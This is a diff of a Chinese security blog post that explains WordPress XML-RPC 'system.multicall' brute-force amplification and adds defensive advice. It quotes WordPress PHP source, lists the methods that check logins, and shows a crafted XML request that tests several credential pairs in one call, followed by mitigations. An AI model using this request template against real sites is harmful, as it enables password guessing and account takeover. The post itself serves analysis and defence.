@@ -1,25 +1,27 @@
 ---
 layout: post
-title: "WordPress 利用 system.multicall RPC进行快速爆破"
-tags: [security, web]
+title: "利用 WordPress XMLRPC 高效爆破 原理分析"
+tags: [web, security]
 ---
 
-xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接口进行账号爆破在很早之前就被提出并加以利用。近日 [SUCURI](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html) 发布文章介绍了利用 xmlrpc 调用接口中的 `system.multicall` 来提高爆破效率，使得成千上万次的帐号密码组合尝试能在一次请求完成，在一定程度上能够躲避日志的检测。
+xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接口进行账号爆破在很早之前就被提出并加以利用。近日 [SUCURI](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html) 发布文章介绍了如何利用 xmlrpc 调用接口中的 `system.multicall` 来提高爆破效率，使得成千上万次的帐号密码组合尝试能在一次请求完成，极大的压缩请求次数，在一定程度上能够躲避日志的检测。
+
+### 一、原理分析
 
 WordPress 中关于 xmlrpc 服务的定义代码主要位于 `wp-includes/class-IXR.php` 和 `wp-includes/class-wp-xmlrpc-server.php` 中。基类 IXR_Server 中定义了三个内置的调用方法，分别为 `system.getCapabilities`，`system.listMethods` 和 `system.multicall`，其调用映射位于 `IXR_Server` 基类定义中：
 
-{% highlight php %}
+``` php
 function setCallbacks()
 {
     $this->callbacks['system.getCapabilities'] = 'this:getCapabilities';
     $this->callbacks['system.listMethods'] = 'this:listMethods';
     $this->callbacks['system.multicall'] = 'this:multiCall';
 }
-{% endhighlight %}
+```
 
 而基类在初始化时，调用 setCallbacks() 绑定了调用映射关系：
 
-{% highlight php %}
+``` php
 function __construct( $callbacks = false, $data = false, $wait = false )
 {
     $this->setCapabilities();
@@ -31,11 +33,11 @@ function __construct( $callbacks = false, $data = false, $wait = false )
         $this->serve($data);
     }
 }
-{% endhighlight %}
+```
 
 再来看看 `system.multicall` 对应的处理函数：
 
-{% highlight php %}
+``` php
 function multiCall($methodcalls)
 {
     // See http://www.xmlrpc.com/discuss/msgReader$1208
@@ -59,7 +61,7 @@ function multiCall($methodcalls)
     }
     return $return;
 }
-{% endhighlight %}
+```
 
 可以从代码中看出，程序会解析请求传递的 XML，遍历多重调用中的每一个接口调用请求，并会将最终有调用的结果合在一起返回给请求端。
 
@@ -67,79 +69,45 @@ function multiCall($methodcalls)
 
 通过阅读 WordPress 中 xmlrpc 相关处理的代码，能大量的 xmlrpc 调用都验证了用户名和密码：
 
-{% highlight php %}
+``` php
     if ( !$user = $this->login($username, $password) )
         return $this->error;
-{% endhighlight %}
+```
 
 通过搜索上述登录验证代码可以得到所有能够用来进行爆破的调用方法列表如下： 
 
-    wp.getUsersBlogs, wp.newPost, wp.editPost, 
-    wp.deletePost, wp.getPost, wp.getPosts, 
-    wp.newTerm, wp.editTerm, wp.deleteTerm, 
-    wp.getTerm, wp.getTerms, wp.getTaxonomy, 
-    wp.getTaxonomies, wp.getUser, wp.getUsers, 
-    wp.getProfile, wp.editProfile, wp.getPage, 
-    wp.getPages, wp.newPage, wp.deletePage, 
-    wp.editPage, wp.getPageList, wp.getAuthors, 
-    wp.getTags, wp.newCategory, wp.deleteCategory, 
-    wp.suggestCategories, wp.getComment, wp.getComments, 
-    wp.deleteComment, wp.editComment, wp.newComment, 
-    wp.getCommentStatusList, wp.getCommentCount, wp.getPostStatusList, 
-    wp.getPageStatusList, wp.getPageTemplates, wp.getOptions, 
-    wp.setOptions, wp.getMediaItem, wp.getMediaLibrary, 
-    wp.getPostFormats, wp.getPostType, wp.getPostTypes, 
-    wp.getRevisions, wp.restoreRevision, blogger.getUsersBlogs, 
-    blogger.getUserInfo, blogger.getPost, blogger.getRecentPosts, 
-    blogger.newPost, blogger.editPost, blogger.deletePost, 
-    mw.newPost, mw.editPost, mw.getPost, 
-    mw.getRecentPosts, mw.getCategories, mw.newMediaObject, 
-    mt.getRecentPostTitles, mt.getPostCategories, mt.setPostCategories
+    wp.getUsersBlogs, wp.newPost, wp.editPost, wp.deletePost, wp.getPost, wp.getPosts, wp.newTerm, wp.editTerm, wp.deleteTerm, wp.getTerm, wp.getTerms, wp.getTaxonomy, wp.getTaxonomies, wp.getUser, wp.getUsers, wp.getProfile, wp.editProfile, wp.getPage, wp.getPages, wp.newPage, wp.deletePage, wp.editPage, wp.getPageList, wp.getAuthors, wp.getTags, wp.newCategory, wp.deleteCategory, wp.suggestCategories, wp.getComment, wp.getComments, wp.deleteComment, wp.editComment, wp.newComment, wp.getCommentStatusList, wp.getCommentCount, wp.getPostStatusList, wp.getPageStatusList, wp.getPageTemplates, wp.getOptions, wp.setOptions, wp.getMediaItem, wp.getMediaLibrary, wp.getPostFormats, wp.getPostType, wp.getPostTypes, wp.getRevisions, wp.restoreRevision, blogger.getUsersBlogs, blogger.getUserInfo, blogger.getPost, blogger.getRecentPosts, blogger.newPost, blogger.editPost, blogger.deletePost, mw.newPost, mw.editPost, mw.getPost, mw.getRecentPosts, mw.getCategories, mw.newMediaObject, mt.getRecentPostTitles, mt.getPostCategories, mt.setPostCategories
     
 这里是用参数传递最少获取信息最直接的 `wp.getUsersBlogs` 进行测试，将两次帐号密码尝试包含在同一次请求里，构造 XML 请求内容为：
 
-{% highlight xml %}
+``` xml
 <methodCall>
   <methodName>system.multicall</methodName>
   <params><param>
     <value><array><data>
-
       <value><struct>
-        <member>
-          <name>methodName</name>
-          <value><string>wp.getUsersBlogs</string></value>
-        </member>
-        <member>
-          <name>params</name>
-          <value><array><data>
-            <value><string>admin</string></value>
-            <value><string>admin888</string></value>
-          </data></array></value>
-        </member>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>admin</string></value>
+          <value><string>admin888</string></value>
+        </data></array></value></member>
       </struct></value>
-
+      
       <value><struct>
-        <member>
-          <name>methodName</name>
-          <value><string>wp.getUsersBlogs</string></value>
-        </member>
-        <member>
-          <name>params</name>
-          <value><array><data>
-            <value><string>guest</string></value>
-            <value><string>test</string></value>
-          </data></array></value>
-        </member>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>guest</string></value>
+          <value><string>test</string></value>
+        </data></array></value></member>
       </struct></value>
-
     </data></array></value>
   </param></params>
 </methodCall>
-{% endhighlight %}
+```
 
 将上面包含两个子调用的 XML 请求发送至 xmlrpc 服务端入口，若目标开启了 xmlrpc 服务会返回类似如下的信息：
 
-{% highlight xml %}
+``` xml
 <?xml version="1.0" encoding="UTF-8"?>
 <methodResponse>
   <params>
@@ -166,12 +134,21 @@ function multiCall($methodcalls)
     </param>
   </params>
 </methodResponse>
-{% endhighlight %}
+```
 
 从结果中可以看到在同一次请求里面处理了两种帐号密码组合，并以集中形式将结果返回，通过该种方式可以极大地提高帐号爆破效率。
 
-当然了，这里不仅要讨论如何进行攻击还要考虑如何去防御这种情况。最直接的方式就是直接关闭 xmlrpc 功能（当然了也可以直接删除xmlrpc.php文件），但是 WordPress 并没有在后台提供关闭 xmlrpc 的功能，但是站长用户可以通过插件或者编码的方式来禁用。(插件可以使用 [Disable XML-RPC](https://wordpress.org/plugins/disable-xml-rpc/)）
+### 二、防护建议
+
+最新版 WordPress(4.3.1) 中仍存在该问题。多重调用（multicall）属于 xmlrpc 的标准，为了防止攻击者利用此点对网站发起爆破攻击，给出以下防护建议：
+
+1. 通过配置 Apache、Nginx 等 Web 服务器来限制 xmlrpc.php 文件的访问;
+2. 在不影响站点运行的情况下可以直接删除 xmlrpc.php 文件;
+3. 从官方插件库中安装 [Disable XML-RPC](https://wordpress.org/plugins/disable-xml-rpc/) 并启用;
+4. 添加代码 `add_filter('xmlrpc_enabled', '__return_false');` 至 WordPress 配置文件 `wp-config.php`;
 
 ### 参考链接
 
 * [https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html)
+* [https://pop.co/blog/protecting-your-wordpress-blog-from-xmlrpc-brute-force-amplification-attacks/](https://pop.co/blog/protecting-your-wordpress-blog-from-xmlrpc-brute-force-amplification-attacks/)
+* [http://www.deluxeblogtips.com/2013/08/disable-xml-rpc-wordpress.html](http://www.deluxeblogtips.com/2013/08/disable-xml-rpc-wordpress.html)
